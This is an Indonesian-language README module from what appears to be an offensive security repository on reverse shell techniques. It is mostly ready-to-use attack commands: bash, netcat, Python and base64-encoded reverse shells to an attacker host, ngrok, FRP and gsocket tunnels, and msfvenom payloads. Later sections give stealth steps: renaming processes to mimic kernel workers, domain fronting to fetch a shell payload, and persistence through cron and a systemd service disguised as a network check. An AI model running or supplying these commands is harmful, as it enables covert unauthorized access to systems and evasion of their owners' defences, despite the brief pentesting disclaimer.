# 🔄 Reverse Shell Techniques

## 📋 Overview

Reverse shell adalah teknik dimana target system menginisiasi koneksi kembali ke attacker, memberikan akses command line remote. Modul ini membahas berbagai metode setup reverse shell yang stealth dan reliable.

## ⚠️ Disclaimer

Teknik ini hanya untuk penetration testing yang sah dan tujuan edukasi. Penggunaan ilegal adalah tanggung jawab pengguna.

## 🎯 Mengapa Reverse Shell?

- ✅ Bypass firewall (outbound connection biasanya diizinkan)
- ✅ NAT traversal otomatis
- ✅ Tidak perlu buka port di attacker machine
- ✅ Lebih stealth dibanding bind shell

## 🔧 Metode Reverse Shell

### 1. Traditional Methods

#### Bash Reverse Shell:
```bash
# Basic bash reverse shell
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1

# Alternative dengan exec
exec 5<>/dev/tcp/ATTACKER_IP/PORT; cat <&5 | while read line; do $line 2>&5 >&5; done

# Base64 encoded untuk bypass
echo "YmFzaCAtaSA+JiAvZGV2L3RjcC9BVFRBQ0tFUl9JUC9QT1JUIDAmMQ==" | base64 -d | bash
```

#### Netcat Reverse Shell:
```bash
# Traditional netcat
nc ATTACKER_IP PORT -e /bin/bash

# Netcat tanpa -e flag
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP PORT > /tmp/f

# Netcat dengan timeout
timeout 3600 nc ATTACKER_IP PORT -e /bin/bash
```

#### Python Reverse Shell:
```python
# Python reverse shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Python3 version
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### 2. Ngrok Setup

**Tujuan**: Tunneling untuk bypass NAT dan firewall

#### Installation:
```bash
# Download ngrok
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
unzip ngrok-stable-linux-amd64.zip
chmod +x ngrok

# Setup auth token
./ngrok authtoken YOUR_NGROK_TOKEN
```

#### Usage:
```bash
# Setup listener di local
nc -lvnp 4444

# Jalankan ngrok di terminal lain
./ngrok tcp 4444

# Ngrok akan memberikan URL seperti: tcp://0.tcp.ap.ngrok.io:12345
# Gunakan di payload:
bash -i >& /dev/tcp/0.tcp.ap.ngrok.io/12345 0>&1
```

#### Advantages:
- ✅ Tidak perlu public IP
- ✅ HTTPS tunneling tersedia
- ✅ Built-in authentication
- ✅ Web interface untuk monitoring

### 3. FRP (Fast Reverse Proxy)

**Tujuan**: Lebih stabil untuk pivoting dan bypass NAT, perlu VPS

#### Server Setup (VPS):
```ini
# frps.ini
[common]
bind_port = 7000
token = YOUR_SECRET_TOKEN
dashboard_port = 7500
dashboard_user = admin
dashboard_pwd = admin123
```

```bash
# Jalankan FRP server
./frps -c frps.ini
```

#### Client Setup (Target):
```ini
# frpc.ini
[common]
server_addr = YOUR_VPS_IP
server_port = 7000
token = YOUR_SECRET_TOKEN

[reverse_shell]
type = tcp
remote_port = 6000
plugin = unix_domain_socket
plugin_unix_path = /tmp/frp_reverse_shell
```

```bash
# Jalankan FRP client
./frpc -c frpc.ini
```

### 4. Gsocket (Global Socket)

**Tujuan**: Encrypted reverse shell dengan NAT traversal otomatis

#### Installation:
```bash
# Auto install script
GS_NOCERTCHECK=1 bash -c "$(curl -fsSLk https://gsocket.io/y)"

# Manual install
apt install gsocket  # Debian/Ubuntu
```

#### Server (Attacker):
```bash
# Listen dengan secret key
gs-netcat -l -s YOUR_SECRET_KEY

# Listen dengan interactive shell
gs-netcat -l -s YOUR_SECRET_KEY -i
```

#### Client (Target):
```bash
# Connect dengan secret key
gs-netcat -c -s YOUR_SECRET_KEY -i

# Background connection
nohup gs-netcat -c -s YOUR_SECRET_KEY -i &
```

#### Advanced Gsocket:
```bash
# Dengan encryption yang lebih kuat
gs-netcat -c -s YOUR_SECRET_KEY -i -C aes256

# Dengan stealth mode
gs-netcat -c -s YOUR_SECRET_KEY -i -q

# Test server compatibility
uname -a && ldd --version
```

#### Advantages:
- ✅ End-to-end encryption
- ✅ NAT traversal otomatis
- ✅ Tidak perlu port forwarding
- ✅ Traffic terlihat seperti HTTPS
- ✅ Binary size kecil (~1MB)

## 📁 Struktur Direktori

- **[gsocket/](./gsocket/)**: Setup dan konfigurasi Global Socket
- **[ngrok-setup/](./ngrok-setup/)**: Panduan dan script Ngrok
- **[frp-setup/](./frp-setup/)**: Konfigurasi Fast Reverse Proxy
- **[payloads/](./payloads/)**: Koleksi payload reverse shell

## 🛠️ Tools Tambahan

### Reverse Shell Generators:
```bash
# MSFVenom payloads
msfvenom -p linux/x86/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe

# Web-based generators
# https://www.revshells.com/
# https://github.com/swisskyrepo/PayloadsAllTheThings
```

### Upgrading Shells:
```bash
# Upgrade ke full TTY
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
stty rows 24 columns 80
```

## 🔒 Stealth Techniques

### 1. Process Hiding:
```bash
# Rename process
exec -a "systemd-worker" gs-netcat -c -s secret -i

# Background dengan nohup
nohup bash -c 'exec -a "kworker" gs-netcat -c -s secret -i' &
```

### 2. Traffic Obfuscation:
```bash
# Via HTTPS proxy
gs-netcat -c -s secret -i --proxy-type https --proxy-host proxy.com:443

# Domain fronting
curl -H "Host: legitimate.com" https://cdn.cloudflare.com/shell-payload
```

### 3. Persistence Integration:
```bash
# Cron job
echo "*/5 * * * * /usr/bin/gs-netcat -c -s secret -i" | crontab -

# Systemd service
cat > /etc/systemd/system/network-check.service << EOF
[Unit]
Description=Network Connectivity Check
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/gs-netcat -c -s secret -i
Restart=always
User=nobody

[Install]
WantedBy=multi-user.target
EOF
```

## ⚡ Tips Praktis

1. **Selalu test koneksi dulu**: `telnet ATTACKER_IP PORT`
2. **Gunakan multiple methods**: Backup jika satu method gagal
3. **Monitor network traffic**: Pastikan tidak mencurigakan
4. **Rotate secret keys**: Ganti key secara berkala
5. **Use legitimate ports**: 80, 443, 53, 22

## 🚨 Troubleshooting

### Common Issues:
- **Connection refused**: Check firewall dan port
- **Binary not found**: Verify installation path
- **Permission denied**: Check file permissions
- **Network timeout**: Test dengan curl/telnet dulu

### Compatibility Check:
```bash
# Check glibc version untuk gsocket
ldd --version

# Check available shells
cat /etc/shells

# Check network connectivity
ping -c 1 8.8.8.8
```

---

**Next**: [03-Persistence](../03-Persistence/) - Mempertahankan akses jangka panjang
